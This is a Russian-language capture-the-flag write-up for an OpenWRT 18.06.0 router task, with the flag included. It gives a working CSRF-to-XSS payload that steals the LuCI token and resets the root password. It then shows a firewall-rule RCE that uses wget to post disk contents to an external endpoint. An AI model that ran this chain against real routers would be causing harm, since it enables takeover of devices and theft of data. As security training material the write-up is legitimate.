## Название: Router
**Описание**: Долго не обновлял роутер, всё равно никому он не нужен, всё равно не взломают... Примечание: для того, чтобы получить флаг, получите RCE и выполните команду `cat /dev/vdb`  
**Флаг**: `rtctf{CSrf_tO_xsS_t0_rC3}`  
**Решение**:  
Используется старая версия OpenWRT - 18.06.0  
Заходим, смотрим, какие дыры в ней есть: https://openwrt.org/docs/guide-developer/security  
Понимаем, что нам сюда:  
Security Advisory 2019-11-05-2 - LuCI CSRF vulnerability (CVE-2019-17367)  

Находим репозиторий с PoC'ом:  
https://github.com/paragmhatre10/OpenWrt-vulnerabilities

Крутим XSS дальше:
```js
alert(document.getElementsByName('token')[0].value); // токен для отправки запросов
```

```js
fetch("/cgi-bin/luci/admin/system/admin", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "no-cache",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarycWWtACHIzPPaRCNH",
    "pragma": "no-cache",
    "upgrade-insecure-requests": "1"
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"token\"\r\n\r\n" + document.getElementsByName('token')[0].value + "\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"cbi.submit\"\r\n\r\n1\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"password.cbid.system._pass.pw1\"\r\n\r\n\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"cbid.system._pass.pw1\"\r\n\r\n" + "hacked" + "\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"password.cbid.system._pass.pw2\"\r\n\r\n\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH\r\nContent-Disposition: form-data; name=\"cbid.system._pass.pw2\"\r\n\r\n" + "hacked" + "\r\n------WebKitFormBoundarycWWtACHIzPPaRCNH--\r\n",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}); // сменить пароль root на 'hacked'
```
`solve/change_password_to_hacked.html` - то же самое, только завёрнуто в eval(atob(...)), чтобы не эскейпить кучу кавычек  
html страничку можно прокинуть через что-нибудь из https://github.com/anderspitman/awesome-tunneling (если нет публичного IP). Я прокинул через https://tunnel.pyjam.as/  

Меняем пароль на свой и можем получить RCE тут: `/cgi-bin/luci/admin/network/firewall/custom`  
Вписываем что-нибудь вроде: `wget --post-data="$(cat /dev/vdb)" http://xxxxxxxxx.x.pipedream.net` и ловим флаг на свой http endpoint (HTTPS не работает из-за ограниченности wget в openwrt).

